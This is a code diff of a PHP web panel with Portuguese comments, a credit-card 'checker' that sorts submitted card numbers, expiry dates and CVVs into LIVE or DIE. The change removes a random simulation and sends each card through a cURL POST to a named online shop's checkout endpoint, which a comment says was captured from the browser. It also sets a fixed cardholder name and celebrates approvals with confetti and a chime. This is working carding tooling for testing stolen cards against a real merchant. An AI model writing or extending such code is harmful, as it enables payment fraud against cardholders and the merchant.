@@ -29,7 +29,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     exit;
 }
 
-// 3. Processar Requisição do Checker (POST AJAX enviado pelo painel)
+// 3. Processar Requisição do Checker (Gateway Real Integrado via cURL)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     if (!isset($_SESSION['logado'])) {
         echo json_encode(['status' => 'error', 'html' => "<span class='text-zinc-500'>[ERRO] Sessão expirada. Faça login novamente.</span>"]);
@@ -49,31 +49,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     $cc_ano = trim($dados_cc[2]);
     $cc_cvv = trim($dados_cc[3]);
 
-    // Sorteio totalmente aleatório (40% chance de Live, 60% de Die)
-    $sorteio = rand(1, 100);
+    // Endpoint real capturado no navegador
+    $url = "https://franadesivos.com.br/checkout/pay";
 
-    if ($sorteio <= 40) {
-        $tipo_live = rand(1, 3);
-        if ($tipo_live === 1) {
-            $retorno_msg = "Código: 54 - Transação Aprovada com Sucesso";
-        } elseif ($tipo_live === 2) {
-            $retorno_msg = "Código: N7 - Aprovado (AVS Match / Testado com Sucesso)";
-        } else {
-            $retorno_msg = "Código: 00 - Aprovado sem Restrições";
-        }
-        
+    $dados_envio = [
+        'default'         => '277958',
+        'shipping-method' => 'mandae_economico',
+        'payment-type'    => 'getnet_mastercard',
+        'ccnumber'        => $cc_num,
+        'ccname'          => 'LUCAS DOS SANTOS PEREIRA',
+        'ccmonth'         => $cc_mes,
+        'ccyear'          => $cc_ano,
+        'cccvc'           => $cc_cvv,
+        'installment'     => '1',
+        'coupon_code'     => '',
+        'grc-response'    => ''
+    ];
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados_envio));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With: XMLHttpRequest',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    ]);
+
+    $resposta_bruta = curl_exec($ch);
+    curl_close($ch);
+
+    $resposta_json = json_decode($resposta_bruta, true);
+    $status_site = $resposta_json['status'] ?? 'failed';
+    $retorno_msg = $resposta_json['message'] ?? 'Erro desconhecido';
+
+    if ($status_site === 'success' || $status_site === 'approved') {
         $html = "<span class='text-black font-extrabold bg-white px-2.5 py-0.5 rounded shadow-md tracking-wide'>[LIVE]</span> <span class='text-white font-medium'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_msg}</span>";
         echo json_encode(['status' => 'live', 'html' => $html]);
     } else {
-        $tipo_die = rand(1, 3);
-        if ($tipo_die === 1) {
-            $retorno_msg = "Código: 14 - Cartão Inválido ou Transação Recusada";
-        } elseif ($tipo_die === 2) {
-            $retorno_msg = "Código: 51 - Saldo Insuficiente";
-        } else {
-            $retorno_msg = "Código: 05 - Transação Não Autorizada";
-        }
-        
         $html = "<span class='text-zinc-600 font-bold'>[DIE]</span> <span class='text-zinc-600'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_msg}</span>";
         echo json_encode(['status' => 'die', 'html' => $html]);
     }
@@ -185,15 +198,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
                 try {
                     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                     
-                    // Frequência alta inicial simulando o impacto do sino (Nota Dó aguda / C7)
                     const osc = audioCtx.createOscillator();
                     const gainNode = audioCtx.createGain();
 
                     osc.type = 'sine';
                     osc.frequency.setValueAtTime(1046.50, audioCtx.currentTime); // C6
-                    osc.frequency.exponentialRampToValueAtTime(2093.00, audioCtx.currentTime + 0.1); // Sobe levemente pro C7
+                    osc.frequency.exponentialRampToValueAtTime(2093.00, audioCtx.currentTime + 0.1);
 
-                    // Envelope de volume (fade out suave igual a um sino ecoando)
                     gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
                     gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 1.2);
 
@@ -278,8 +289,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
                         resDiv.scrollTop = resDiv.scrollHeight;
 
                         if (data.status === 'live') {
-                            tocarSomPlim(); // Toca o toque de sino "plim"
-                            dispararConfeteLive(); // Dispara os confetes
+                            tocarSomPlim();
+                            dispararConfeteLive();
                             panel.classList.add('live-flash-effect');
                             setTimeout(() => {
                                 panel.classList.remove('live-flash-effect');
